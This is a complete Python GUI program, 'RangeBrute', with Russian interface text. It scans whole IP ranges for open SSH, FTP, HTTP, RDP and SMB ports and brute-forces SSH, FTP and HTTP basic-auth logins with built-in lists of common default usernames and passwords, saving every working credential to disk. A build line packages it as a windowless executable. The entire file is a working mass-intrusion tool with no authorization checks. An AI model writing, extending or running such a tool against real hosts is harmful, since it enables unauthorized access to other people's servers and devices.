# language: Python, file: rangebrute_gui.py
# Зависимости: paramiko, requests
# Сборка: pyinstaller --noconsole --onefile --name rangebrute_gui rangebrute_gui.py

import ftplib
import ipaddress
import os
import socket
import sys
import threading
import time
import urllib3
import tkinter as tk
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from tkinter import filedialog, messagebox, scrolledtext, ttk

import paramiko
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= НАСТРОЙКИ =================
THREADS = 100
TIMEOUT = 3
BRUTE_DELAY = 0.1
NETWORK_RETRIES = 3
MAX_RANGE_SIZE = 65536

SUCCESS_DIR = "success"
ERROR_DIR = "error"

PORT_PROTOCOLS = {
    22: "ssh", 21: "ftp", 3389: "rdp", 445: "smb",
    8080: "http", 80: "http", 443: "http",
}

DEFAULT_USERS = ["root", "admin", "user", "test", "guest", "ubuntu", "pi", "oracle", "postgres"]
DEFAULT_PASSWORDS = [
    "root", "admin", "password", "123456", "12345678", "qwerty", "qwerty123",
    "admin123", "toor", "letmein", "welcome", "1234", "12345", "pass",
    "P@ssw0rd", "Password1", "test", "guest", "ubuntu", "pi", "raspberry",
]


def ensure_dirs():
    os.makedirs(SUCCESS_DIR, exist_ok=True)
    os.makedirs(ERROR_DIR, exist_ok=True)


def save_success(ip, port, proto, user, pwd):
    ensure_dirs()
    path = os.path.join(SUCCESS_DIR, f"{ip}_{port}_{proto}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{ip}:{port} {proto} {user}:{pwd}\n")


def save_error(ip, port, proto, reason=""):
    ensure_dirs()
    path = os.path.join(ERROR_DIR, f"{ip}_{port}_{proto}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{ip}:{port} {proto} {reason}\n")


def check_port(ip, port, timeout=TIMEOUT):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False


def brute_ssh(ip, port, users, passwords, log_cb):
    for user in users:
        for pwd in passwords:
            for attempt in range(NETWORK_RETRIES):
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=user, password=pwd,
                                   timeout=TIMEOUT, banner_timeout=TIMEOUT,
                                   auth_timeout=TIMEOUT, allow_agent=False,
                                   look_for_keys=False)
                    save_success(ip, port, "ssh", user, pwd)
                    log_cb(f"[SUCCESS] {ip}:{port} ssh {user}:{pwd}")
                    client.close()
                    return True
                except paramiko.AuthenticationException:
                    time.sleep(BRUTE_DELAY)
                    break
                except Exception:
                    time.sleep(BRUTE_DELAY)
    return False


def brute_ftp(ip, port, users, passwords, log_cb):
    for user in users:
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=TIMEOUT)
                ftp.login(user, pwd)
                save_success(ip, port, "ftp", user, pwd)
                log_cb(f"[SUCCESS] {ip}:{port} ftp {user}:{pwd}")
                ftp.quit()
                return True
            except ftplib.error_perm:
                time.sleep(BRUTE_DELAY)
            except Exception:
                time.sleep(BRUTE_DELAY)
    return False


def brute_http(ip, port, users, passwords, log_cb):
    scheme = "https" if port == 443 else "http"
    url = f"{scheme}://{ip}:{port}/"
    for user in users:
        for pwd in passwords:
            try:
                r = requests.get(url, auth=(user, pwd), timeout=TIMEOUT,
                                 verify=False, allow_redirects=False)
                if r.status_code not in (401, 403):
                    save_success(ip, port, "http", user, pwd)
                    log_cb(f"[SUCCESS] {ip}:{port} http {user}:{pwd}")
                    return True
            except Exception:
                time.sleep(BRUTE_DELAY)
    return False


def brute_host(ip, port, proto, users, passwords, log_cb):
    log_cb(f"[BRUTE] {ip}:{port} ({proto}) — старт")
    if proto == "ssh":
        ok = brute_ssh(ip, port, users, passwords, log_cb)
    elif proto == "ftp":
        ok = brute_ftp(ip, port, users, passwords, log_cb)
    elif proto == "http":
        ok = brute_http(ip, port, users, passwords, log_cb)
    elif proto in ("rdp", "smb"):
        save_error(ip, port, proto, "protocol not implemented")
        log_cb(f"[SKIP] {ip}:{port} ({proto}) — не реализовано")
        return False
    else:
        save_error(ip, port, proto, "unknown protocol")
        return False

    if not ok:
        save_error(ip, port, proto, "brute failed")
        log_cb(f"[FAIL] {ip}:{port} ({proto}) — не подобран")
    return ok


def scan_host(ip, users, passwords, log_cb):
    for port, proto in PORT_PROTOCOLS.items():
        if check_port(ip, port):
            log_cb(f"[OPEN] {ip}:{port} ({proto})")
            brute_host(ip, port, proto, users, passwords, log_cb)


def parse_range(range_str):
    if "/" in range_str:
        net = ipaddress.ip_network(range_str, strict=False)
        hosts = list(net.hosts())
        if len(hosts) > MAX_RANGE_SIZE:
            raise ValueError(f"диапазон слишком большой: {len(hosts)} > {MAX_RANGE_SIZE}")
        return [str(ip) for ip in hosts]
    if "-" in range_str:
        start_s, end_s = range_str.split("-", 1)
        start = int(ipaddress.ip_address(start_s.strip()))
        end = int(ipaddress.ip_address(end_s.strip()))
        if end < start:
            raise ValueError("конец < начало")
        size = end - start + 1
        if size > MAX_RANGE_SIZE:
            raise ValueError(f"диапазон слишком большой: {size}")
        return [str(ipaddress.ip_address(i)) for i in range(start, end + 1)]
    return [range_str.strip()]


# ================= GUI =================
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("RangeBrute — Scanner + Bruteforce")
        self.root.geometry("900x650")
        self.root.configure(bg="#1e1e1e")
        self.running = False

        top = tk.Frame(root, bg="#1e1e1e")
        top.pack(fill="x", padx=10, pady=10)

        tk.Label(top, text="Диапазон (CIDR / интервал / IP):", fg="#ccc", bg="#1e1e1e",
                 font=("Consolas", 11)).grid(row=0, column=0, sticky="w")
        self.range_entry = tk.Entry(top, bg="#2a2a2a", fg="#fff", insertbackground="#fff",
                                    font=("Consolas", 12), width=40)
        self.range_entry.grid(row=0, column=1, padx=5, pady=5)
        self.range_entry.insert(0, "192.168.1.0/24")

        tk.Label(top, text="Юзеры (через запятую):", fg="#ccc", bg="#1e1e1e",
                 font=("Consolas", 11)).grid(row=1, column=0, sticky="w")
        self.users_entry = tk.Entry(top, bg="#2a2a2a", fg="#fff", insertbackground="#fff",
                                    font=("Consolas", 12), width=60)
        self.users_entry.grid(row=1, column=1, padx=5, pady=5)
        self.users_entry.insert(0, ",".join(DEFAULT_USERS))

        tk.Label(top, text="Пароли (через запятую):", fg="#ccc", bg="#1e1e1e",
                 font=("Consolas", 11)).grid(row=2, column=0, sticky="w")
        self.pass_entry = tk.Entry(top, bg="#2a2a2a", fg="#fff", insertbackground="#fff",
                                   font=("Consolas", 12), width=60)
        self.pass_entry.grid(row=2, column=1, padx=5, pady=5)
        self.pass_entry.insert(0, ",".join(DEFAULT_PASSWORDS))

        btn_frame = tk.Frame(root, bg="#1e1e1e")
        btn_frame.pack(fill="x", padx=10, pady=5)

        self.start_btn = tk.Button(btn_frame, text="▶ Старт", command=self.start,
                                   bg="#4CAF50", fg="#fff", font=("Consolas", 12, "bold"),
                                   bd=0, padx=20, pady=8)
        self.start_btn.pack(side="left", padx=5)

        tk.Button(btn_frame, text="📁 Загрузить users.txt", command=self.load_users,
                  bg="#2a2a2a", fg="#fff", font=("Consolas", 11),
                  bd=0, padx=10, pady=8).pack(side="left", padx=5)
        tk.Button(btn_frame, text="📁 Загрузить passwords.txt", command=self.load_passwords,
                  bg="#2a2a2a", fg="#fff", font=("Consolas", 11),
                  bd=0, padx=10, pady=8).pack(side="left", padx=5)

        self.progress = ttk.Progressbar(root, orient="horizontal", length=850, mode="determinate")
        self.progress.pack(padx=10, pady=5)

        self.log_text = scrolledtext.ScrolledText(root, bg="#2a2a2a", fg="#ccc",
                                                  font=("Consolas", 10), height=20)
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)

        self.status = tk.Label(root, text="Готов", fg="#888", bg="#1e1e1e",
                               font=("Consolas", 11))
        self.status.pack(side="bottom", pady=5)

    def log(self, msg):
        self.root.after(0, lambda: self._log(msg))

    def _log(self, msg):
        self.log_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see("end")

    def load_users(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if path:
            with open(path, "r", encoding="utf-8") as f:
                users = [l.strip() for l in f if l.strip()]
            self.users_entry.delete(0, "end")
            self.users_entry.insert(0, ",".join(users))

    def load_passwords(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if path:
            with open(path, "r", encoding="utf-8") as f:
                pwds = [l.strip() for l in f if l.strip()]
            self.pass_entry.delete(0, "end")
            self.pass_entry.insert(0, ",".join(pwds))

    def start(self):
        if self.running:
            return
        range_str = self.range_entry.get().strip()
        users = [u.strip() for u in self.users_entry.get().split(",") if u.strip()]
        passwords = [p.strip() for p in self.pass_entry.get().split(",") if p.strip()]
        if not range_str or not users or not passwords:
            messagebox.showerror("Ошибка", "Заполни диапазон, юзеров и пароли.")
            return
        try:
            ips = parse_range(range_str)
        except Exception as e:
            messagebox.showerror("Ошибка диапазона", str(e))
            return

        self.running = True
        self.start_btn.config(state="disabled")
        self.progress["value"] = 0
        self.progress["maximum"] = len(ips)
        self.log(f"Диапазон: {range_str} → {len(ips)} адресов")
        self.log(f"Юзеров: {len(users)}, паролей: {len(passwords)}")

        def worker():
            done = 0
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                futures = {executor.submit(scan_host, ip, users, passwords, self.log): ip
                           for ip in ips}
                for future in as_completed(futures):
                    ip = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        save_error(ip, 0, "scan", str(e))
                    done += 1
                    self.root.after(0, lambda d=done: self.progress.config(value=d))
            self.root.after(0, self._done)

        threading.Thread(target=worker, daemon=True).start()

    def _done(self):
        self.running = False
        self.start_btn.config(state="normal")
        self.status.config(text="Готово")
        self.log("=" * 50)
        self.log("Готово. Результаты в success/ и error/")
        messagebox.showinfo("Готово", "Сканирование завершено.\n"
                                       "Результаты в папках success/ и error/.")


def main():
    ensure_dirs()
    root = tk.Tk()
    App(root)
    root.mainloop()


if __name__ == "__main__":
    main()
